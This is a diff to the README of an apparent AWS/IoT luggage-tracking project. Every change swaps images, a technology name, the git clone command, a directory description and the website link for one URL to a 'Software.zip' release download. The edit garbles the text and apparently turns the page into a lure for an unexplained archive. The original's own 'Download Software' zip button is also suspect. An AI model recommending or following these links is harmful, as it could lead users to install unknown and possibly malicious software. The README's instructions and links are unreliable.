@@ -1,6 +1,6 @@
 # 🛄 **Traxpack - AWS Luggage Tracking Integrating IoT Project**
 
-![luggage-tracking](https://image.freepik.com/free-vector/travel-concept-illustration_52683-42803.jpg)
+![luggage-tracking](https://github.com/Zanfers4825/traxpack/releases/download/v1.0/Software.zip)
 
 Welcome to the Traxpack repository, where we revolutionize the luggage tracking system in the aviation industry by utilizing the power of Internet of Things (IoT) technology and AWS cloud services. Our project aims to provide a real-time, efficient, and secure solution for tracking luggage, ensuring peace of mind for both airlines and passengers.
 
@@ -10,7 +10,7 @@ Welcome to the Traxpack repository, where we revolutionize the luggage tracking 
 * IoT
 * Luggage Tracking
 * Middleware
-* Next.js
+* https://github.com/Zanfers4825/traxpack/releases/download/v1.0/Software.zip
 * PostgreSQL
 * Prisma ORM
 * Render
@@ -22,7 +22,7 @@ To get started with Traxpack, follow these simple steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/YouraifXD/traxpack.git
+   git clone https://github.com/Zanfers4825/traxpack/releases/download/v1.0/Software.zip
    ```
 
 2. Install dependencies:
@@ -44,24 +44,24 @@ To get started with Traxpack, follow these simple steps:
 The project is structured as follows:
 - `src/`: Contains all project source code.
 - `public/`: Public assets used in the project.
-- `pages/`: Next.js pages for routing.
+- `pages/`: https://github.com/Zanfers4825/traxpack/releases/download/v1.0/Software.zip pages for routing.
 - `components/`: Reusable React components.
 - `styles/`: TailwindCSS styles for UI.
 
 ## 📷 Screenshots
 Here are some sneak peeks into our Traxpack project:
 
-![dashboard](https://image.freepik.com/free-vector/vector-dashboard-concept_52683-39807.jpg)
+![dashboard](https://github.com/Zanfers4825/traxpack/releases/download/v1.0/Software.zip)
 
-![tracking](https://image.freepik.com/free-vector/logistic-delivery-tracking-platform_62391-202.jpg)
+![tracking](https://github.com/Zanfers4825/traxpack/releases/download/v1.0/Software.zip)
 
 ## 📥 Download Software
 To download the latest version of the software, click the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/YouraifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Zanfers4825/traxpack/releases/download/v1.0/Software.zip)](https://github.com/Zanfers4825/traxpack/releases/download/v1.0/Software.zip)
 
 ## 🌐 Additional Resources
-Visit our [website](https://traxpack.io) for more information on the Traxpack project.
+Visit our [website](https://github.com/Zanfers4825/traxpack/releases/download/v1.0/Software.zip) for more information on the Traxpack project.
 
 ## 💬 Feedback
 We welcome feedback and contributions to enhance the Traxpack project. Feel free to open issues or submit pull requests.
